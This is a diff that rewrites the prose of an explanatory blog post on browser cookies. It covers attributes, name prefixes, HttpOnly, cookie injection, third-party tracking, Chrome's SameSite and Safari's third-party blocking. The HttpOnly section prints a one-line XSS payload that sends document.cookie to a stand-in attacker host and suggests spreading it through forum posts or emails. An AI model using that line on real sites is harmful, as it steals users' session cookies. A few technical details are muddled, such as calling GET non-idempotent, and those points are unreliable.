@@ -11,21 +11,21 @@ thumbnail: './images/cookie/thumbnail.png'
     <sup>Image by: <a href="https://www.freepik.com/premium-vector/hand-drawn-illustration-cookie_2795450.htm">https://www.freepik.com/</a></sup>
 </div>
 
-You've probably heard of "cookies" at least once, whether through last year's [Chrome SameSite](https://www.chromium.org/updates/same-site) policy announcement or while implementing a website's authentication features. This post looks at what cookies are, what kinds exist, and the browser policies tied to their characteristics.
+Between last year's [Chrome SameSite](https://www.chromium.org/updates/same-site) policy and whatever authentication feature you last had to build, chances are "cookies" have crossed your radar at some point. Here's what a cookie actually is, the different kinds out there, and the browser policies shaped around how they behave.
 
 ## Cookies
 
-A cookie is a small file that stores a website's information on the browser side. A DB stores data at the client's request, but a cookie works the opposite way — it's the server telling the client, **"Hold onto this file for me!"**
+A cookie is a small file the browser holds onto on a website's behalf. A database stores data because the client asked it to; a cookie works the other way around — it's the server telling the client, **"Hang onto this for me!"**
 
-Cookies are also implemented on top of HTTP headers. The server can ask the client to store a date and time using a response header like the following.
+Cookies ride on top of HTTP headers. A server asks the client to store something, say a date, through a response header like this.
 
 ```js
 Set-Cookie: DATE=March/4/2020
 ```
 
-It's requested in a `name=value` format, and the client stores that value. This lets the server determine things like whether it's the site's first visit.
+It's sent as `name=value`, and the client stores that pair. That's how a server can tell, for instance, whether this is your first visit to a site.
 
-Cookies can also be read or set from the browser.
+The browser can read and set cookies too.
 
 ```js
 console.log(document.cookie)
@@ -36,98 +36,97 @@ guest_id=v1%3A1...; _ga=GA1.2...
 
 ## Cookie Attributes
 
-A cookie is specified in the format `<cookie-name>=<cookie-value>`, and `cookie-name` must consist of ASCII characters excluding control characters, spaces, and tabs, and can't include special symbols.
+A cookie takes the form `<cookie-name>=<cookie-value>`. `cookie-name` has to be ASCII, excluding control characters, spaces, and tabs, and it can't contain special symbols.
 
-- **__Secure-**: A cookie name starting with `__Secure-` must have the `secure` flag set, and must be on an HTTPS page.
-- **__Host-**: A cookie starting with `__Host-` must likewise have the secure flag set, must be on an HTTPS page, and must not specify a domain. (This means it can't be shared with subdomains.) Also, Path must be set to `/`.
+- **__Secure-**: Any cookie name starting with `__Secure-` must carry the `secure` flag, and the page must be HTTPS.
+- **__Host-**: A `__Host-` cookie needs all of that too, plus no domain specified (so it can never be shared with subdomains), and its Path must be `/`.
 
 ```js
 // Example
-// The __Secure- prefix requires the Secure attribute.
+// __Secure- prefix requires the Secure attribute.
 // Since it has no Secure attribute, this cookie is ignored.
 document.cookie = '__Secure-invalid-without-secure=1';
-// A case where a cookie with the __Secure- prefix is applied
+// __Secure- prefix cookie applied correctly
 document.cookie = '__Secure-valid-with-secure=1; Secure';
 
-// A cookie with the __Host- prefix is ignored if it's
-// missing either the Path or Secure attribute.
+// __Host- prefix cookies are ignored if either
+// Path or Secure is missing.
 document.cookie = '__Host-invalid-without-secure-or-path=1';
 document.cookie = '__Host-invalid-without-path=1; Secure';
 
-// A case where a cookie with the __Host- prefix is applied
+// __Host- prefix cookie applied correctly
 document.cookie = '__Host-valid-with-secure-and-path=1; Secure; Path=/';
 ```
 
-Below are several optional cookie attributes.
+A handful of optional attributes round out a cookie's definition.
 
 **Expires=\<date>**
 
-The maximum lifetime of the cookie. If not specified, it's treated as a **session cookie** and is destroyed when the client closes. It's treated as a value relative to the client, not the server.
+How long the cookie can live. Skip it and the browser treats the cookie as a **session cookie**, wiping it once the client closes. This is measured relative to the client, not the server.
 
 **Max-Age=\<number>**
 
-Expresses the time until the cookie expires, in seconds. If 0 or a negative number is specified, the cookie expires immediately; IE6, 7, and 8 don't support this header. If both `Expires` and `Max-Age` are specified, `Max-Age` takes priority.
+Seconds until the cookie expires. 0 or negative expires it immediately, and IE6, 7, and 8 don't honor this header at all. Set both `Expires` and `Max-Age`, and `Max-Age` wins.
 
 **Domain=\<domain-value>**
 
-Domain defines the scope of the cookie and indicates which site created it. If not specified, it's applied based on the current page URL.
-For example, a cookie set with `Domain=so-so.dev` can't be used on any site other than so-so.dev.
+Domain scopes the cookie, marking which site owns it. Skip it and the current page's URL becomes the scope. A cookie set with `Domain=so-so.dev`, for example, is off-limits to every site except so-so.dev.
 
 **Path=\<path-value>**
 
-Indicates the URL path the requested resource must be under before the cookie is sent. For example, if `path=/soso` is specified, the cookie can be sent for paths like `/soso`, `/soso/jbee`, etc.
+The URL path a request has to fall under before the cookie gets attached. Set `path=/soso` and the cookie ships along with requests to `/soso`, `/soso/jbee`, and so on.
 
 **Secure**
 
-Cookies with this option set are only sent when the server uses SSL, over the HTTPS protocol.
+Cookies flagged this way only go out over HTTPS, when the server is actually using SSL.
 
 **HttpOnly**
 
-An option set to protect the user's cookies.
+An attribute that shields the cookie from the page's own scripts.
 
-For example, a hacker could intercept a user's cookies with code like the following.
+Without it, an attacker could grab a user's cookies with something as simple as this.
 
 ```js
 location.href = 'https://😈.com?cookies=' + document.cookie
 ```
 
-If a post containing this code is put up on a message board or in an email and a user clicks it, all of that user's cookies get sent to the 😈 site.
+Slip that into a forum post or an email, get someone to click it, and every cookie that user has gets shipped straight to the 😈 site.
 
-This is an option that prevents cookies from being accessed via document.cookie, in order to defend against this kind of CSS (Cross-Site Scripting) attack.
+HttpOnly is the defense: it blocks document.cookie from reading the cookie at all, which shuts this exact flavor of CSS (Cross-Site Scripting) attack down cold.
 
 ## Things to Watch Out For
 
-Cookies are convenient, but they come with a few constraints, so you need to use them carefully.
+Cookies are convenient, but they come with real limits, so treat them carefully.
 
 ### Persistence
 
-First, there's the persistence problem. Cookies aren't guaranteed to be reliably stored under all circumstances. Depending on incognito mode or the browser's security settings, the server's request to keep a cookie once the session ends may be ignored. So cookies are best suited for storing **information that's fine to lose, or data that can be restored from server-side information**.
+First: persistence. A cookie isn't guaranteed to survive no matter what. Incognito mode, or a tightened browser security setting, can simply ignore the server's request to keep a cookie around past the session. So cookies are best reserved for **information you can afford to lose, or anything the server can reconstruct on its own**.
 
-### Capacity
+### Size
 
-The maximum size of a cookie is fixed at 4KB. You can't fit much data into a cookie, and since it's always attached to every request, this adds to the amount of data transferred, which affects both request and response speed.
+A cookie tops out at 4KB. That's not much room, and since every cookie tags along with every request, it adds overhead to your traffic — overhead that slows down both the request and the response.
 
 ### Security
 
-Last is the security problem. Setting the `secure` attribute means the cookie is only sent over encrypted HTTPS communication, but over plain HTTP, the cookie is sent as plaintext. So you shouldn't store things like passwords in it, and even when it's encrypted, since the user can freely access it, there's still a risk of tampering.
+Last, security. Add the `secure` attribute and the cookie only travels encrypted, over HTTPS — but plain HTTP still ships it as cleartext. Never park a password in one, and even encrypted, the user can poke at it freely, so tampering is always a risk.
 
 ### Cookie Injection
 
-Cookie injection is a method that exploits the cookie spec in reverse to bypass an HTTPS connection. It involves overwriting a cookie of a domain hidden behind HTTPS (e.g. *example.com*) from a different subdomain over plain HTTP (e.g. *subdomain.example.com*), or invalidating the cookie of the domain originally designated as HTTPS by setting a more specific cookie (e.g. *example.com/someapp*).
+Cookie injection turns the cookie spec against itself to slip past an HTTPS connection. An attacker overwrites the cookie of a domain that's supposed to be locked to HTTPS (say, *example.com*) from a plain-HTTP subdomain (*subdomain.example.com*), or sets a more specific cookie path (*example.com/someapp*) to knock out the cookie that domain was relying on.
 
-In March 2017, Chrome and Firefox announced [countermeasures](https://www.chromestatus.com/feature/4506322921848832) against cookie injection.
+Chrome and Firefox rolled out [countermeasures](https://www.chromestatus.com/feature/4506322921848832) for this back in March 2017.
 
-It's no longer possible to reconfigure cookies from a subdomain, and even within the same domain, a cookie with `secure` attached can't be overwritten over HTTP.
+Subdomains can no longer reconfigure a cookie this way, and even on the same domain, a `secure` cookie can't be clobbered over plain HTTP anymore.
 
 ## First Party, Third Party
 
-A First Party cookie is one where the service the browser accesses writes a cookie that's only valid within that service. A Third Party cookie, on the other hand, is a cookie inserted so it can be read by an external service — for purposes like advertising — enabling behavior tracking across sites.
+A First Party cookie is one the service you're on writes for itself, valid only within that service. A Third Party cookie is the opposite: something planted so an outside service, usually an ad network, can read it and track behavior across sites you never gave it direct access to.
 
-A Third Party cookie belongs to a site (ad-tech.com) different from the site you accessed (origin.com).
+A Third Party cookie belongs to a different site (ad-tech.com) than the one you're actually on (origin.com).
 
 ![first-vs-third](./images/cookie/first-vs-third.png)
 
-You can request it by including a tag like the following on origin.com.
+origin.com pulls this off with a tag like the following.
 
 ```html
 <a href="ad.doubleclick.net/some-other-parameters-specific-to-this-ad" target="_blank" rel="noopener">
@@ -135,27 +134,27 @@ You can request it by including a tag like the following on origin.com.
 </a>
 ```
 
-When the page loads, the ad markup also loads, a request is sent to *[ad.doubleclick.net/the-extension-to-the-creative](http://ad.doubleclick.net/the-extension-to-the-creative)*, and a cookie is delivered to the user.
+The page loads, the ad markup loads with it, a request goes out to *[ad.doubleclick.net/the-extension-to-the-creative](http://ad.doubleclick.net/the-extension-to-the-creative)*, and a cookie comes back to the user.
 
-Third Party cookies aren't free from security concerns. For example, if a user logs into a banking site to make a credit card payment and then, without logging out, navigates to a malicious site, a CSRF attack can occur. Because the user is still "authenticated" on the banking site, the malicious site could trigger actions like a money transfer.
+Third Party cookies drag their own security baggage along. Say a user logs into a bank to pay off a credit card, doesn't log out, and wanders onto a malicious site — that's a CSRF attack waiting to happen. The user is still "authenticated" on the bank's side, so the malicious page can trigger something like a transfer without them noticing.
 
-For one more example, suppose someone uses an image from so-so.dev on another site. If the user has previously received a cookie from so-so.dev, then when that other site requests the so-so.dev image, that cookie gets sent along with the request. The other site doesn't use so-so.dev's cookie itself, but since it's making a request to so-so.dev, that cookie ends up being used from another site.
+Here's another angle: imagine someone embeds an so-so.dev image on their own site. If a visitor already picked up an so-so.dev cookie at some point, requesting that image from the other site sends the cookie right along with it. The other site never touches that cookie directly, but because the request still goes to so-so.dev, the cookie effectively gets used from somewhere it was never meant to be.
 
-If someone is logged in on evil.com and it's using an image from so-so.dev, it could also send a request directly to so-so.dev.
+Flip it around: if someone's logged into evil.com and evil.com happens to load an so-so.dev image, that request goes straight to so-so.dev too.
 
 ## Chrome - SameSite
 
-To protect users from these security risks, Google announced a new cookie policy called SameSite. In this case, web developers need to manage cookies using the SameSite attribute component in the `Set-Cookie` header.
+To shut down exactly this kind of risk, Google rolled out a cookie policy called SameSite. It puts the SameSite attribute on the `Set-Cookie` header, and it's now on developers to configure it.
 
-The values you can pass for the SameSite attribute are Strict, Lax, and None.
+SameSite takes one of three values: Strict, Lax, or None.
 
 |Value|Description|
 |------|---|
-|Strict|A cookie with this setting can only be accessed when visiting the domain it was originally set on. In other words, Strict blocks the cookie from being used across sites. This option is best suited for high-security applications like banking.|
-|Lax|Cookies with this setting are sent only on same-site requests or top-level navigation with non-idempotent HTTP requests, like HTTP GET . So this option is used when you want third parties to be able to use the cookie, with the added security benefit of not falling victim to CSRF attacks.|
-|None|Means the cookie can still be used in a Third Party context, as before.|
+|Strict|A cookie set this way is only ever readable when you're visiting the exact domain that set it, full stop — no cross-site use at all. Best fit for something like a banking app.|
+|Lax|Cookies with this setting are sent only on same-site requests or top-level navigation with non-idempotent HTTP requests, like HTTP GET . So this is the middle ground: a third party can still use the cookie, while getting some protection from CSRF along the way.|
+|None|Business as usual — the cookie stays usable in a Third Party context.|
 
-When set to `SameSite=Lax`, the cookie is only allowed for navigation between the same top-level domain (e.g. so-so.dev → statis.so-so.dev).
+Set `SameSite=Lax`, and the cookie only survives navigation within the same top-level domain (so-so.dev → statis.so-so.dev, say).
 
 ```html
 <p>Example</p>
@@ -163,15 +162,15 @@ When set to `SameSite=Lax`, the cookie is only allowed for navigation between th
 <p>Read the <a href="https://other.dev/cat.html">article</a>.</p>
 ```
 
-In the example above, the cookie is set like this.
+Here's the cookie behind that example.
 
 ```
 Set-Cookie: test=1; SameSite=Lax
 ```
 
-If the user is on so-so.dev, the cookie isn't sent, but if they navigate to `[https://other.dev/cat.html](https://other.dev/cat.html)`, the cookie is sent. The `Lax` option is suitable for cookies that affect site content.
+Sitting on so-so.dev, the cookie never goes out — but click through to `[https://other.dev/cat.html](https://other.dev/cat.html)` and it does. `Lax` fits cookies that shape what the site actually shows you.
 
-Starting with version 80, Chrome changed the default to `SameSite=Lax`. If you want to handle a cookie with the `SameSite=None` option, you need to add the Secure option as well.
+Chrome flipped its default to `SameSite=Lax` starting in version 80. Want `SameSite=None` instead? You'll need to tack on Secure too.
 
 ```
 Set-cookie: 3pcookie=value; SameSite=None; Secure
@@ -179,7 +178,7 @@ Set-cookie: 3pcookie=value; SameSite=None; Secure
 
 ## Webkit - Full Third-Party Cookie Blocking
 
-There was a significant change to Intelligent Tracking Prevention (ITP) in the Safari 13.1 update. According to Apple's John Wilander, a WebKit engineer, **Third Party cookies are now blocked** in Safari. (This is similar to Google's SameSite policy, but while Google is rolling it out gradually through 2020, Safari shipped it at 100% in 13.1.)
+Safari 13.1 landed a major shift in Intelligent Tracking Prevention (ITP). Per Apple's John Wilander, a WebKit engineer, Safari now **blocks Third Party cookies** outright. (This tracks with Google's SameSite move, except where Google is rolling it out gradually through 2020, Safari just flipped the switch to 100% in 13.1.)
 
 <a href="https://twitter.com/johnwilander/status/1242513313507860480?ref_src=twsrc^tfw|twcamp^tweetembed|twterm^1242513313507860480&ref_url=https%3A%2F%2Fwww.theverge.com%2F2020%2F3%2F24%2F21192830%2Fapple-safari-intelligent-tracking-privacy-full-third-party-cookie-blocking">
   <img src="/media/web/images/cookie/twitter.png"/>
